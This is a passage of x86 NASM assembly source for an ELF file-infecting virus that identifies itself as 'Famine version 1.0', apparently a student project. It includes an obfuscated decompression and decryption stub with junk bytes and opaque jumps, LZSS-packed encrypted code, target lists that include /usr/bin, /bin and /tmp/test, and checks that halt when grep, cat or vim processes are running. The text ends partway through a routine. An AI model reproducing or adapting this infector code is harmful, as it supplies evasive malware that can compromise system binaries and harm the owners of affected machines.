; REGISTERS : %m6, %m7, %m8, %vsp
; Do not touch those registers as they contain sensitive data
; about different memory pages addresses.

%include "inc.asm"

DEFAULT rel
GLOBAL _start

SECTION .text

    nop
_start:
    nop
    call        _virus

align 16
_signature:
    .start: db "Famine version 1.0 (c)oded by mamaurai:xchalle - "
    .startsize: equ $-.start
    .index: times 0x4 db 0x30
    db 0x00
align 16
_eos:

;- GLOBAL variables ----------------------------------
signature_len: equ _eos-_signature
non_packed_len: equ _packed-_start
virus_len: dd 0x00000000
entrypoint: dq 0x0000000000000000
;-----------------------------------------------------
; PUBLIC PART (This part isn't encrypted or packed).
_public:
;-----------------------------------------------------
; Public Structures (Structures used by public
; functions).
struc _UEC_OFF
    .mapaddr    resq 0x1
endstruc
struc _LZSSD_OFF
    .buffer     resb WINDOW_LENGTH*2
    .inputaddr  resq 0x1
    .outputaddr resq 0x1
    .length     resq 0x1
    .index      resd 0x1
    .bits_buf   resb 0x1
    .mask       resb 0x1
    .bits       resq 0x1
endstruc
;-----------------------------------------------------
; Public Preprocessor Values.
tracerline_size: equ 11
columns_size: equ 7
lines_size: equ 5
debugging_size: equ 23
original_virus_len: equ _eof-_start
;-----------------------------------------------------
; Public code.
;-----------------------------------------------------
_virus:
    jmp         ..@ePCyA8gPhg7S
..@PWElEZkUHtOc:
    mov         BYTE [rsp+_LZSSD_OFF.buffer+rdi], al
    jmp         $+5
db 0x7c, 0xa4, 0x64
    jmp         ..@vTUk9xlayeYK
..@iSRRlhz1UBsL:
    sub         rsp, _UEC_OFF_size
    xor         rax, rax
    jmp         $+5
db 0x15, 0xa4, 0x57
    jb          ..@9SQJ1KyjkO8V
    jae         ..@9SQJ1KyjkO8V
..@cRPB32gs8IGk:
    jle         ..@xHu7sbPi6jEs
    js          ..@Ppk5Nz4j1vRf
    jns         ..@Ppk5Nz4j1vRf
..@1wE8MCdNfI90:
    jmp         rax
    jmp         $+5
db 0x41, 0x46, 0x58
    js          ..@vaJzJxN41pfZ
    jns         ..@vaJzJxN41pfZ
..@ip3HBhOByeW8:
    jz          ..@PxjBWq6kMCuT
    call        Strncmp
    jmp         $+4
db 0x4f, 0x2c
    jmp         $+4
db 0x46, 0x17
    jl          ..@B2IWaDo6sEhy
    jge         ..@B2IWaDo6sEhy
..@hHXGTkNoEJoF:
    mov         BYTE [rsp+_LZSSD_OFF.mask], 10000000b
    js          ..@dRIQR0vASyRx
    jns         ..@dRIQR0vASyRx
..@go9gBTv9zQ6b:
    VAR         public, _start
    jmp         $+3
db 0x0d
    jmp         ..@XsxTQdYCityh
..@y0iYqHtYjaQ9:
    mov         rax, SYS_EXIT
    syscall
    jmp         $+5
db 0xb4, 0x3e, 0x6b
    jmp         Strlen
..@KUy03Jf4pziV:
    mov         dl, BYTE [rbx]
    mov         BYTE [rsp+_LZSSD_OFF.bits_buf], dl
    inc         QWORD [rsp+_LZSSD_OFF.inputaddr]
    jmp         $+4
db 0x64, 0x13
    jmp         $+3
db 0x9a
    jl          ..@jU5JVSs5JeS3
    jge         ..@jU5JVSs5JeS3
..@M8RSpfJbGBwc:
    mov         al, BYTE [rsp+_LZSSD_OFF.buffer+rbx]
    jmp         ..@GwizjppHVujB
..@FAaSt74bVols:
    shr         BYTE [rsp+_LZSSD_OFF.mask], 1
    sub         rcx, 1
    jnz         ..@OZKT2TCeeBR9
    jmp         $+3
db 0x06
    jmp         ..@ZNLYr316BbW5
..@QZ0FLnnsPcut:
    and         DWORD [rsp+_LZSSD_OFF.index], WINDOW_LENGTH-1
    jl          ..@65r94AZYbedV
    jge         ..@65r94AZYbedV
..@i7vo3WcvoO3Y:
    GGLOBAL     virus_len
    jmp         $+5
db 0x73, 0xb0, 0x0e
    jmp         ..@Gq9ZXkV09EwE
..@l6Noz4RaSym1:
    syscall
    add         rsp, bytes
    js          ..@go9gBTv9zQ6b
    jns         ..@go9gBTv9zQ6b
..@HUIDEOhBHU6y:
    DESTROY_MX_VAR
    jb          ..@y0iYqHtYjaQ9
    jae         ..@y0iYqHtYjaQ9
..@rRtzfosmSfhz:
%ifdef X86_64
    mov         eax, SYS_MMAP
    syscall
%endif
    jl          ..@gCpQ2yyM8ydq
    jge         ..@gCpQ2yyM8ydq
..@nxqDK37csq6u:
    sub         rsp, _UEC_OFF_size
    jl          ..@af4lzlLniBy0
    jge         ..@af4lzlLniBy0
..@lUnoVWO4YTDh:
    push        r1
    push        r2
    jb          ..@FStrAxENfVwA
    jae         ..@FStrAxENfVwA
DecryptExecutableCode:
    jmp         ..@JcnVrwXda5Py
..@hBGgOvh4wm8W:
    jmp         DecryptExecutableCode
    js          ExitProgram
    jns         ExitProgram
..@vTUk9xlayeYK:
    inc         DWORD [rsp+_LZSSD_OFF.index]
    and         DWORD [rsp+_LZSSD_OFF.index], WINDOW_LENGTH-1
    jmp         ..@Ppk5Nz4j1vRf
    jb          ..@1J0rOiBmCOXQ
    jae         ..@1J0rOiBmCOXQ
..@9j5b4OzA5dhu:
    test        rax, rax
    jl          ..@gkndM0yTh34m
    jge         ..@gkndM0yTh34m
..@xQIOO4P2sWi1:
    sub         r1, QWORD [r5]
    jmp         $+4
db 0x4c, 0xae
    js          ..@ybAv1EUW6SxX
    jns         ..@ybAv1EUW6SxX
..@mwYuEodbbNgz:
    call        ..@EAkqVOpo6VBj
    mov         QWORD [rsp+_LZSSD_OFF.bits], rax
    cmp         QWORD [rsp+_LZSSD_OFF.length], 0x00
    jmp         $+4
db 0x55, 0x44
    jl          ..@LiiMd90JANlg
    jge         ..@LiiMd90JANlg
..@1J0rOiBmCOXQ:
    mov         rcx, POSITION_BITS
    js          ..@FUQB7xT8GRzd
    jns         ..@FUQB7xT8GRzd
..@IsUIGQAXdwE0:
    xor         rax, rax
    mov         rax, SYS_FORK
    syscall
    jmp         $+5
db 0xaf, 0x8d, 0xd1
    jmp         ..@9sWQekiuaCCq
..@naFdmuZdjTRs:
    jmp         ..@zJHLCZY9LZxK
    js          ..@PxjBWq6kMCuT
    jns         ..@PxjBWq6kMCuT
..@n6RsqFsuY1rL:
    xor         rax, rax
    jmp         $+5
db 0xfe, 0xb7, 0x65
    jb          ..@4ji68uBq3Od2
    jae         ..@4ji68uBq3Od2
..@WZnNMW6hcX7R:
    mov         BYTE [rbx], al
    inc         QWORD [rsp+_LZSSD_OFF.outputaddr]
    js          ..@CQ0Rbw3prmpY
    jns         ..@CQ0Rbw3prmpY
..@GwizjppHVujB:
    mov         rbx, [rsp+_LZSSD_OFF.outputaddr] 
    je          ..@WZnNMW6hcX7R
    jne         ..@WZnNMW6hcX7R
ExitProgram:
    jmp         ..@HUIDEOhBHU6y
..@vTMo1WfC2Pyr:
    xor         r3, r3
    jmp         ..@HDohP8DvHWox
..@a8kEs1wexSX9:
    jmp         ..@OG5arZfV7JhP
    jmp         $+4
db 0xa8, 0xcd
    js          ..@EAkqVOpo6VBj
    jns         ..@EAkqVOpo6VBj
..@prphkvozpsBb:
%ifdef X86_32
    push        ebp
%endif
    jmp         ..@JjMJrT2S0awN
..@kBEnzlI6WPNN:
    jnz         ..@WGBGvuwgMhUp
    jmp         ..@n6RsqFsuY1rL
Strlen:
    jmp         ..@y0qFVvBRtt0h
..@9APLYwkUCdhJ:
    call        ..@EAkqVOpo6VBj
    jb          ..@qWKYo5O1ZnDg
    jae         ..@qWKYo5O1ZnDg
..@Gw6EnTXn087i:
%ifdef X86_32
    mov         esi, 0x22
%endif
    jmp         $+3
db 0xed
    jb          ..@bXYVOiRXq5SK
    jae         ..@bXYVOiRXq5SK
..@2t7XWpRRImDK:
    je          ..@hBGgOvh4wm8W
    jl          ..@IsUIGQAXdwE0
    jge         ..@IsUIGQAXdwE0
..@UR56wCV6bVXA:
    inc         DWORD [rsp+_LZSSD_OFF.index]
    jb          ..@QZ0FLnnsPcut
    jae         ..@QZ0FLnnsPcut
..@JjMJrT2S0awN:
%ifdef X86_32
    xor         ebp, ebp
    mov         eax, SYS_MMAP2
    int         0x80
%endif
    jmp         ..@INu6QLOFAEus
..@FUQB7xT8GRzd:
    call        ..@EAkqVOpo6VBj
    mov         rsi, rax 
    mov         rcx, LENGTH_BITS
    jb          ..@9APLYwkUCdhJ
    jae         ..@9APLYwkUCdhJ
..@jU5JVSs5JeS3:
    dec         QWORD [rsp+_LZSSD_OFF.length]
    jmp         $+4
db 0x8c, 0x23
    jl          ..@hHXGTkNoEJoF
    jge         ..@hHXGTkNoEJoF
..@qqtqByWtlZ9x:
    jz          ..@cmSJDuBcrtlO
    jmp         $+4
db 0x23, 0x5c
    jmp         $+5
db 0x3c, 0x02, 0x05
    jb          ..@EV6C7aKIbamB
    jae         ..@EV6C7aKIbamB
..@77nAVOBcKIFa:
    ret
    jb          GetEnv
    jae         GetEnv
..@gJdutEVoxeFM:
    mov         rax, 0x20
    rep         stosb
    jmp         ..@Ppk5Nz4j1vRf
    jmp         $+3
db 0xd2
    jmp         $+3
db 0x4e
    jmp         $+3
db 0x30
    jl          ..@9j5b4OzA5dhu
    jge         ..@9j5b4OzA5dhu
..@gCpQ2yyM8ydq:
    mov         QWORD [rsp+_UEC_OFF.mapaddr], rax
    js          ..@sHo9mrpbJhby
    jns         ..@sHo9mrpbJhby
..@9sWQekiuaCCq:
    cmp         eax, 0x0
    jmp         ..@aKNDFaCIz5ct
..@aEzKUoWU1TiV:
    or          eax, 1
    jb          ..@FAaSt74bVols
    jae         ..@FAaSt74bVols
..@jQmCPB7nSAVO:
    jz          ..@FAaSt74bVols
    jl          ..@aEzKUoWU1TiV
    jge         ..@aEzKUoWU1TiV
..@L4tkelbkqSts:
    cmp         cl, dl
    jb          ..@cRPB32gs8IGk
    jae         ..@cRPB32gs8IGk
..@eI6d6lC20Ff1:
    syscall
    test        eax, eax
    je          ..@h054aDmLyqi1
    jne         ..@h054aDmLyqi1
..@9SQJ1KyjkO8V:
    xor         r1, r1
    xor         r2, r2
    xor         r3, r3
    jmp         $+3
db 0xfc
    jmp         $+5
db 0x9b, 0x32, 0x2c
    jl          ..@58XYHNrz0tNL
    jge         ..@58XYHNrz0tNL
..@Ea5r42zaGAqB:
    cmp         BYTE [r2], al
    jmp         ..@2lrPSKEcB8JT
..@ll6P3DNyngv4:
    syscall
    xor         rax, rax
    mov         rax, SYS_FORK
    jmp         ..@eI6d6lC20Ff1
..@cp0RQTGGPODw:
    xor         rax, rax
    mov         r1, QWORD [rsp+_UEC_OFF.mapaddr]
    jmp         $+3
db 0xf6
    jmp         ..@3JwzgOLIDKhb
..@P1uTfbL9bhwG:
    mov         rcx, 8
    call        ..@EAkqVOpo6VBj
    jb          ..@MTI4UMouMiN1
    jae         ..@MTI4UMouMiN1
..@BrGsRgzdCDi6:
    cmp         BYTE [r1 + rax], 0x0
    jmp         ..@2sXumVbvMrll
..@vaJzJxN41pfZ:
    xor         rax, rax
    mov         eax, SYS_SETSID
    jmp         $+4
db 0x31, 0x87
    js          ..@ll6P3DNyngv4
    jns         ..@ll6P3DNyngv4
..@2sXumVbvMrll:
    jz          ..@WkOiv6m731lc
    add         rax, 1
    jmp         ..@BrGsRgzdCDi6
    jmp         $+3
db 0x5c
    jb          ..@WkOiv6m731lc
    jae         ..@WkOiv6m731lc
..@INu6QLOFAEus:
%ifdef X86_32
    pop         ebp
%endif
    js          ..@7gpwY1Vskr9Z
    jns         ..@7gpwY1Vskr9Z
..@4ji68uBq3Od2:
    pop         r3
    pop         r2
    jl          ..@cpG9o5UtoDxw
    jge         ..@cpG9o5UtoDxw
..@cC1ZV8YmjLIa:
    jne         ..@iSRRlhz1UBsL
    GGLOBAL     _packed
    mov         m8, r5 
    jmp         $+3
db 0x38
    jmp         ..@GnBqsbnjek6o
..@jCeA7Y2elKof:
    sub         rdi, 0x5
    INIT_MX_VAR
    mov         vsp, rdi
    jmp         $+3
db 0x96
    jmp         ..@v3vHqrQUHaQP
GetEnv:
    jmp         ..@zo3nzzi66TEZ
..@sw8zWvdpEFIk:
    mov         m8, rax
    je          ..@qwqFc1CQvPUO
    jne         ..@qwqFc1CQvPUO
..@AYkoptFzQBMX:
    xor         r1, r1
    jmp         $+5
db 0xf9, 0x77, 0x06
    jmp         $+5
db 0x52, 0x3e, 0x98
    jmp         $+3
db 0x97
    js          ..@W8LviW5CVfkw
    jns         ..@W8LviW5CVfkw
..@WGBGvuwgMhUp:
    mov         al, BYTE [r1]
    js          ..@Ea5r42zaGAqB
    jns         ..@Ea5r42zaGAqB
..@ybAv1EUW6SxX:
    DESTROY_MX_VAR
    mov         rax, r1
    jl          ..@3ThlNfTI3jgQ
    jge         ..@3ThlNfTI3jgQ
..@v3vHqrQUHaQP:
    mov         rdi, rbp
    jmp         $+4
db 0xf1, 0xab
    jmp         ..@i4pNlwoU6SdC
..@cpG9o5UtoDxw:
    pop         r1
    jmp         $+5
db 0xac, 0xfb, 0xfe
    jmp         $+4
db 0x58, 0xd9
    jmp         ..@77nAVOBcKIFa
..@qwqFc1CQvPUO:
    call        rax
    js          ..@cp0RQTGGPODw
    jns         ..@cp0RQTGGPODw
..@xHu7sbPi6jEs:
    mov         rbx, rsi
    jmp         ..@Yi5Sicsdtnjl
..@lgaoOng0Z6Im:
    ret
    jmp         DecryptExecutableCode
..@CFN8hsFw20kW:
    xor         rbx, rbx
    jl          ..@OZKT2TCeeBR9
    jge         ..@OZKT2TCeeBR9
..@T1vyLOnis5kK:
    inc         QWORD [rsp+_LZSSD_OFF.outputaddr]
    mov         edi, DWORD [rsp+_LZSSD_OFF.index]
    jmp         $+4
db 0xcc, 0xdf
    je          ..@PWElEZkUHtOc
    jne         ..@PWElEZkUHtOc
..@HDohP8DvHWox:
    xor         r4, r4
    GGLOBAL     entrypoint
    cmp         QWORD [r5], 0x0000000000000000
    jmp         ..@2t7XWpRRImDK
..@rCm2NO9ZTgQ4:
    mov         BYTE [rsp+_LZSSD_OFF.mask], 0x0
    mov         QWORD [rsp+_LZSSD_OFF.length], r2
    jmp         $+5
db 0x25, 0xb7, 0x53
    jmp         $+3
db 0x1b
    jb          ..@NxuZviPLU7Co
    jae         ..@NxuZviPLU7Co
..@AXwP7MmpPZDA:
    jne         ..@i4pNlwoU6SdC
    jmp         ..@U1caRFkQvY9t
..@af4lzlLniBy0:
    call        ExitProgram
    jmp         LzssDecoder
..@qWKYo5O1ZnDg:
    add         rax, 1
    mov         rdx, rax
    xor         rax, rax
    jmp         $+5
db 0x71, 0xff, 0x9b
    je          ..@kgo08ldFu2ZQ
    jne         ..@kgo08ldFu2ZQ
..@h054aDmLyqi1:
    jz          ..@hBGgOvh4wm8W
    jmp         $+5
db 0x89, 0x8f, 0x09
    je          ..@36xqktsOByzF
    jne         ..@36xqktsOByzF
..@B2IWaDo6sEhy:
    test        rax, rax
    jl          ..@qqtqByWtlZ9x
    jge         ..@qqtqByWtlZ9x
LzssDecoder:
    jmp         ..@Xhgft2TRiXBh
..@2lrPSKEcB8JT:
    je          ..@axXo7L094pWV
    sub         al, BYTE [r2]
    jmp         $+3
db 0xc9
    js          ..@Fg0mxMS9vYyx
    jns         ..@Fg0mxMS9vYyx
..@cmSJDuBcrtlO:
    mov         rax, r2
    pop         r1
    jmp         $+5
db 0xd3, 0x6a, 0x84
    js          ..@lgaoOng0Z6Im
    jns         ..@lgaoOng0Z6Im
..@i4pNlwoU6SdC:
    add         rdi, bytes
    cmp         QWORD [rdi], 0x00
    jmp         ..@AXwP7MmpPZDA
..@Fg0mxMS9vYyx:
    jmp         ..@4ji68uBq3Od2
    jmp         $+3
db 0x9c
    jmp         $+4
db 0x68, 0x2a
    jmp         $+5
db 0xa4, 0x77, 0xa7
    jmp         ..@axXo7L094pWV
..@xYXxb7oOwai5:
    xor         r3, r3
    xor         r4, r4
    mov         rax, SYS_WAIT4
    js          ..@l6Noz4RaSym1
    jns         ..@l6Noz4RaSym1
..@WkOiv6m731lc:
    ret
    jb          Strncmp
    jae         Strncmp
..@36xqktsOByzF:
    xor         rdi, rdi
    call        ExitProgram
    jl          ..@hBGgOvh4wm8W
    jge         ..@hBGgOvh4wm8W
..@zo3nzzi66TEZ:
    push        r1
    call        Strlen
    mov         r3, rax
    jmp         ..@rPB9fQkNZOe7
..@dRIQR0vASyRx:
    shl         eax, 1
    mov         dl, BYTE [rsp+_LZSSD_OFF.bits_buf]
    and         dl, BYTE [rsp+_LZSSD_OFF.mask]
    jmp         $+4
db 0xb8, 0x81
    jmp         $+5
db 0xc7, 0x73, 0xb9
    jl          ..@0CzEWlT7DjXc
    jge         ..@0CzEWlT7DjXc
..@EAkqVOpo6VBj:
    pop         rdi
    xor         rax, rax
    xor         rdx, rdx
    jmp         $+5
db 0x23, 0x61, 0xcb
    jmp         ..@CFN8hsFw20kW
..@aKNDFaCIz5ct:
    jl          ..@nrmLBDQI3vif
    test        eax, eax
    jz          ..@vaJzJxN41pfZ
    jb          ..@nrmLBDQI3vif
    jae         ..@nrmLBDQI3vif
..@ePCyA8gPhg7S:
    pop         rdi
    sub         rdi, 1
    jmp         $+5
db 0x3d, 0x1a, 0xc5
    jmp         $+5
db 0x7e, 0x86, 0xf7
    jl          ..@jCeA7Y2elKof
    jge         ..@jCeA7Y2elKof
..@Ppk5Nz4j1vRf:
    mov         rcx, 1
    jmp         $+5
db 0xf9, 0x53, 0x72
    jmp         ..@mwYuEodbbNgz
..@B8dvUmOXsv57:
%ifdef X86_32
    mov         edx, 111b
%endif
    jb          ..@Gw6EnTXn087i
    jae         ..@Gw6EnTXn087i
..@rPB9fQkNZOe7:
    mov         r4, m4
    jmp         $+4
db 0x69, 0x9c
    jmp         $+3
db 0xdc
    jl          ..@zJHLCZY9LZxK
    jge         ..@zJHLCZY9LZxK
..@K90Jiwe0HW5g:
%ifdef X86_64
    mov         r10, 0x22
    mov         r8, 0xffffffffffffffff
%endif
    jmp         $+5
db 0x8d, 0x31, 0x08
    jl          ..@rRtzfosmSfhz
    jge         ..@rRtzfosmSfhz
..@kgo08ldFu2ZQ:
    xor         rcx, rcx
    xor         rdi, rdi
    jl          ..@xHu7sbPi6jEs
    jge         ..@xHu7sbPi6jEs
..@MTI4UMouMiN1:
    xor         rdi, rdi
    mov         rbx, [rsp+_LZSSD_OFF.outputaddr] 
    jmp         ..@Ii8tN47spgS1
..@JcnVrwXda5Py:
    GGLOBAL     virus_len
    jb          ..@s5xPCF9AgW0z
    jae         ..@s5xPCF9AgW0z
..@W8LviW5CVfkw:
    xor         r2, r2
    jmp         $+5
db 0xbe, 0x80, 0xb5
    je          ..@vTMo1WfC2Pyr
    jne         ..@vTMo1WfC2Pyr
..@OG5arZfV7JhP:
    add         rsp, _LZSSD_OFF_size
    jmp         $+4
db 0x63, 0x2d
    jmp         ..@tOc1jq0765hw
..@pStBAm2hANF1:
    ret
    jmp         ..@OG5arZfV7JhP
..@y0qFVvBRtt0h:
    xor         rax, rax
    js          ..@BrGsRgzdCDi6
    jns         ..@BrGsRgzdCDi6
..@Xhgft2TRiXBh:
    sub         rsp, _LZSSD_OFF_size
    jmp         $+3
db 0xff
    js          ..@Fo4DTWUyDBe7
    jns         ..@Fo4DTWUyDBe7
..@65r94AZYbedV:
    add         ecx, 1
    jmp         $+4
db 0x34, 0xc2
    jb          ..@L4tkelbkqSts
    jae         ..@L4tkelbkqSts
..@FStrAxENfVwA:
    push        r3
    xor         rax, rax
    jmp         $+5
db 0xc9, 0xdd, 0x4b
    jmp         $+5
db 0x04, 0xd6, 0xf3
    je          ..@WGBGvuwgMhUp
    jne         ..@WGBGvuwgMhUp
..@U1caRFkQvY9t:
    add         rdi, bytes
    mov         m4, rdi
    jmp         ..@AYkoptFzQBMX
..@tOc1jq0765hw:
    ret
    jmp         $+4
db 0xe0, 0xd8
Strncmp:
    jmp         ..@lUnoVWO4YTDh
..@PxjBWq6kMCuT:
    xor         r2, r2
    js          ..@cmSJDuBcrtlO
    jns         ..@cmSJDuBcrtlO
..@XsxTQdYCityh:
    mov         r1, r5
    VAR         public, entrypoint
    jmp         ..@xQIOO4P2sWi1
..@NxuZviPLU7Co:
    mov         DWORD [rsp+_LZSSD_OFF.index], WINDOW_LENGTH-LOOKAHEAD_LENGTH
    js          ..@fRL2m3pbGZdb
    jns         ..@fRL2m3pbGZdb
..@0CzEWlT7DjXc:
    test        dl, dl
    jmp         $+5
db 0xb5, 0x3d, 0xac
    js          ..@jQmCPB7nSAVO
    jns         ..@jQmCPB7nSAVO
..@4J9xp5uP2PB7:
    add         r2, 1
    dec         r3
    jmp         $+5
db 0x66, 0x12, 0xfd
    jmp         $+4
db 0x04, 0x4b
    jmp         ..@kBEnzlI6WPNN
..@LiiMd90JANlg:
    jg          ..@9j5b4OzA5dhu
    jmp         ..@a8kEs1wexSX9
..@Ii8tN47spgS1:
    mov         BYTE [rbx], al
    js          ..@T1vyLOnis5kK
    jns         ..@T1vyLOnis5kK
..@Fo4DTWUyDBe7:
    mov         QWORD [rsp+_LZSSD_OFF.inputaddr], r1
    jb          ..@QmitKaGXMLkn
    jae         ..@QmitKaGXMLkn
..@EV6C7aKIbamB:
    add         r4, bytes
    js          ..@naFdmuZdjTRs
    jns         ..@naFdmuZdjTRs
..@9eFv2ITG8ape:
    call        LzssDecoder
    jmp         $+5
db 0x5d, 0x31, 0x53
    je          ..@LLeSXag6RfDz
    jne         ..@LLeSXag6RfDz
..@Zcp2UWDy5yLQ:
    mov         edi, DWORD [rsp+_LZSSD_OFF.index]
    mov         BYTE [rsp+_LZSSD_OFF.buffer+rdi], al
    jmp         ..@UR56wCV6bVXA
..@gkndM0yTh34m:
    jz          ..@1J0rOiBmCOXQ
    jmp         $+5
db 0xd9, 0x95, 0x77
    jmp         $+3
db 0x60
    je          ..@P1uTfbL9bhwG
    jne         ..@P1uTfbL9bhwG
..@3JwzgOLIDKhb:
    mov         r2, original_virus_len-non_packed_len
    mov         rax, SYS_MUNMAP
    syscall
    jmp         $+3
db 0x50
    jmp         $+5
db 0x1d, 0xbc, 0xb2
    js          ..@nxqDK37csq6u
    jns         ..@nxqDK37csq6u
..@aq19aAhGGc2J:
    mov         r3, QWORD [rsp+_UEC_OFF.mapaddr]
    je          ..@9eFv2ITG8ape
    jne         ..@9eFv2ITG8ape
..@nrmLBDQI3vif:
    mov         r1, rax
    xor         r2, r2
    je          ..@xYXxb7oOwai5
    jne         ..@xYXxb7oOwai5
..@CQ0Rbw3prmpY:
    xor         rdi, rdi
    jb          ..@Zcp2UWDy5yLQ
    jae         ..@Zcp2UWDy5yLQ
..@s5xPCF9AgW0z:
    cmp         DWORD [r5], 0x00000000
    jmp         ..@cC1ZV8YmjLIa
..@Gq9ZXkV09EwE:
    xor         r2, r2
    mov         r2d, DWORD [r5]
    sub         r2, non_packed_len
    jmp         $+3
db 0x17
    jl          ..@aq19aAhGGc2J
    jge         ..@aq19aAhGGc2J
..@ZNLYr316BbW5:
    push        rdi
    jb          ..@pStBAm2hANF1
    jae         ..@pStBAm2hANF1
..@Yi5Sicsdtnjl:
    add         bx, cx
    and         bx, WINDOW_LENGTH-1
    jmp         ..@M8RSpfJbGBwc
..@58XYHNrz0tNL:
%ifdef X86_32
    mov         ecx, original_virus_len-non_packed_len
%endif
    jmp         $+4
db 0x92, 0x8d
    js          ..@B8dvUmOXsv57
    jns         ..@B8dvUmOXsv57
..@sHo9mrpbJhby:
    GGLOBAL     _packed
    mov         r1, r5
    jmp         $+5
db 0xc1, 0xf9, 0xc7
    jmp         $+3
db 0x83
    jb          ..@i7vo3WcvoO3Y
    jae         ..@i7vo3WcvoO3Y
..@3VKfgjoba2Nb:
    mov         rbx, QWORD [rsp+_LZSSD_OFF.inputaddr]
    je          ..@KUy03Jf4pziV
    jne         ..@KUy03Jf4pziV
..@zJHLCZY9LZxK:
    mov         r1, QWORD [rsp]
    mov         r2, QWORD [r4]
    test        r2, r2
    jb          ..@ip3HBhOByeW8
    jae         ..@ip3HBhOByeW8
..@kXOlX8HufZLh:
    jnz         ..@dRIQR0vASyRx
    jmp         $+4
db 0x2c, 0xce
    jl          ..@3VKfgjoba2Nb
    jge         ..@3VKfgjoba2Nb
..@axXo7L094pWV:
    add         r1, 1
    js          ..@4J9xp5uP2PB7
    jns         ..@4J9xp5uP2PB7
..@fRL2m3pbGZdb:
    mov         rcx, WINDOW_LENGTH-LOOKAHEAD_LENGTH 
    jmp         $+5
db 0x36, 0xb2, 0xcb
    jb          ..@6jgYotLUKeU4
    jae         ..@6jgYotLUKeU4
..@LLeSXag6RfDz:
    mov         rax, QWORD [rsp+_UEC_OFF.mapaddr]
    jmp         $+5
db 0x9d, 0x71, 0x02
    jb          ..@sw8zWvdpEFIk
    jae         ..@sw8zWvdpEFIk
..@7gpwY1Vskr9Z:
%ifdef X86_64
    xor         r9, r9
    mov         esi, original_virus_len-non_packed_len
    mov         edx, 111b
%endif
    jb          ..@K90Jiwe0HW5g
    jae         ..@K90Jiwe0HW5g
..@xGzbkzaMCbtf:
    xor         r1, r1
    call        ExitProgram
    jb          ..@iSRRlhz1UBsL
    jae         ..@iSRRlhz1UBsL
..@6jgYotLUKeU4:
    lea         rdi, QWORD [rsp+_LZSSD_OFF.buffer] 
    jmp         $+3
db 0x9f
    jmp         $+4
db 0xf0, 0x9a
    jmp         $+5
db 0xe8, 0x4f, 0x37
    jb          ..@gJdutEVoxeFM
    jae         ..@gJdutEVoxeFM
..@GnBqsbnjek6o:
    call        Processes
    jmp         ..@xGzbkzaMCbtf
..@3ThlNfTI3jgQ:
    xor         r1, r1
    xor         r2, r2
    xor         r3, r3
    jmp         $+3
db 0xfb
    jmp         $+5
db 0x9f, 0xbc, 0xb9
    js          ..@l3SbY9cWinRk
    jns         ..@l3SbY9cWinRk
..@OZKT2TCeeBR9:
    cmp         BYTE [rsp+_LZSSD_OFF.mask], 0x00
    jmp         $+3
db 0x41
    jmp         $+5
db 0x64, 0x9d, 0xa5
    jmp         ..@kXOlX8HufZLh
..@QmitKaGXMLkn:
    mov         QWORD [rsp+_LZSSD_OFF.outputaddr], r3
    je          ..@rCm2NO9ZTgQ4
    jne         ..@rCm2NO9ZTgQ4
..@bXYVOiRXq5SK:
%ifdef X86_32
    mov         edi, 0xffffffff
%endif
    jmp         $+3
db 0x58
    jmp         $+3
db 0x79
    jmp         $+5
db 0xb7, 0x6a, 0xdb
    jb          ..@prphkvozpsBb
    jae         ..@prphkvozpsBb
..@l3SbY9cWinRk:
    xor         r4, r4
    xor         r5, r5
    jl          ..@1wE8MCdNfI90
    jge         ..@1wE8MCdNfI90

;-----------------------------------------------------
; PACKED & ENCRYPTED PART (This part of the code is 
; packed with LZSS then encrpyted and is executed in 
; a mapped zone).
_packed:
    jmp         Processes
;-----------------------------------------------------
; Packed & Encrypted structures.
struc _PROC_OFF
    .dirname    resq 0x1
    .dirfd      resd 0x1
    .dirbuf     resb DIRENT_BUFSIZE
    .dirnread   resq 0x1
    .dirindex   resq 0x1
    .buffer     resb 0x100
    .filefd     resd 0x1
endstruc
struc _NBF_OFF
    .index      resw 0x1
    .file       resq 0x1
    .key        resb 0x20
endstruc
struc _PAYLOAD_OFF
    .key        resb 0x20
    .index      resw 0x1
    .entry      resq 0x1
endstruc
struc _LZSSE_OFF
    .buffer     resb WINDOW_LENGTH*2
    .inputaddr  resq 0x1
    .outputaddr resq 0x1
    .saveoutptr resq 0x1
    .length     resq 0x1
    .buffersize resw 0x1
    .la_index   resw 0x1
    .w_index    resw 0x1
    .cmp_len    resb 0x1
    .match_pos  resw 0x1
    .match_len  resb 0x1
    .character  resb 0x1
    .bits       resb 0x1
    .mask       resb 0x1
endstruc
struc _UPDATASIG_OFF
    .signaddr   resq 0x1
    .index      resw 0x1
endstruc
struc _INFDIR_OFF
    .depth      resb 0x1
    .dirname    resq 0x1
    .dirfd      resd 0x1
    .dirbuf     resb DIRENT_BUFSIZE
    .dirnread   resq 0x1
    .dirindex   resq 0x1
    .buffer     resb 0x101*(SUBDIR_MAXDEPTH+1)
endstruc
struc _INFFILE_OFF
    .file       resb file_size
    .entry      resq 0x1
endstruc
struc _VADDR_OFF
    ._vaddr     resq 0x1
    .tmp_vaddr  resq 0x1
    .tmp_offset resq 0x1
endstruc
struc _DYNPIE_OFF
    .ptr        resq 0x1
    .sh_ptr     resq 0x1
    .shentsize  resw 0x1
    .shnum      resw 0x1
endstruc
;-----------------------------------------------------
; Packed & Encrypted variables.
VARIABLES packed
procdir:    db "/proc/", 0
status:     db "/status", 0

procs: 
proc3:      db "grep", 0
proc2:      db "cat", 0
proc1:      db "vim", 0
db 0x00

pwd_var:    db "PWD", 0

dirs_root:
bindir1:    db "/usr/local/sbin", 0
bindir2:    db "/usr/local/bin", 0
bindir3:    db "/usr/sbin", 0
bindir4:    db "/usr/bin", 0
bindir5:    db "/sbin", 0
bindir6:    db "/bin", 0
dirs_tmp:
test2:      db "/tmp/test2", 0
test:       db "/tmp/test", 0
db 0x00
;-----------------------------------------------------
; Packed & Encrypted code.
;-----------------------------------------------------
Processes:
    jmp         ..@vs2p6tc4FMs5
..@QfYQX6WrtWqK:
    add         rsi, QWORD [rdi+s_h.sh_offset]
    jmp         ..@ttOAdsWh1y1x
..@LJqM4o0imLtz:
    xor         r4, r4
    jmp         ..@gQvvxN7q3uVp
..@ZauhbCjyYQdl:
    mov         al, BYTE [rsp+_LZSSE_OFF.buffer+rbx]
    jmp         ..@OaQhCKndHfvF
..@6u57JzVvJWLE:
    call        MapFile
    cmp         rax, 0
    jmp         $+5
db 0x7f, 0xa9, 0xcd
    jl          ..@02ONdobWIwKZ
    jge         ..@02ONdobWIwKZ
..@cwFp3z8AfOk8:
    jmp         ..@EiQxSn9l5KFR
    jmp         $+5
db 0x0d, 0x71, 0x34
    jmp         ..@EiQxSn9l5KFR
..@eNZAwRuqqkgy:
    mov         rax, SYS_FORK
    syscall
